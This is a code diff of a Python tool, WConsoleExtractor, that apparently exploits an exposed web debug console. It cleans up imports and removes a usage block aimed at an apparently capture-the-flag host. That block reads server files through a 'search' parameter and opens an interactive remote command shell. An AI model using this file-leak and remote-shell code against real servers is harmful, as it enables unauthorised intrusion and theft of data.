@@ -4,7 +4,6 @@ import re
 import hashlib
 from itertools import chain
 from bs4 import BeautifulSoup as bs
-import sys
 
 def error(message=""):
     print(f"[ERROR] {message}")
@@ -100,12 +99,9 @@ class WConsoleExtractor:
         return headers.get("Server")
     
     def input(self):
-        # inp = sys.stdin.readline()
-        #return inp.strip()
         return input()
     
     def print(self, message=""):
-        # sys.stdout.write(message)
         print(message, end="")
     
     # Leaks
@@ -224,23 +220,3 @@ class WConsoleExtractor:
             cmd = self.input()
 
             self.print(f"{self.exec_cmd(cmd)}\n")
-
-
-
-from bs4 import BeautifulSoup as bs
-
-base_url = "https://chall-hosting.0xhorizon.eu"
-
-def leak_file(file) -> str:
-    r = requests.get(f"https://chall-hosting.0xhorizon.eu/services?search={file}")
-
-    soup = bs(r.text, 'html.parser')
-
-    return soup.find("center").contents[1].strip()
-
-extractor = WConsoleExtractor(
-    "https://chall-hosting.0xhorizon.eu",
-    leak_file
-)
-
-extractor.shell()
